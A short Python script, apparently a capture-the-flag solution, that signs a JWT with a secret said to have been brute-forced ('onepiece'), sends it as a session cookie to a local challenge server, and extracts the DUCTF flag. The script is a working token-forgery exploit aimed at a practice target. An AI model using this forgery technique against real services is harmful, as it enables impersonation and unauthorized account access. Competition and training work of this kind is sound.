from requests import get
import jwt
import re

# bruteforce JWT secret -> "onepiece"
encoded_jwt = jwt.encode({'sub': 1}, 'onepiece', algorithm='HS256')

r = get('http://0.0.0.0:1337/profile', headers={'Cookie': f'access_token_cookie={encoded_jwt}'})
flag = re.findall(r'DUCTF{.*}', r.text)[0]
print(flag)
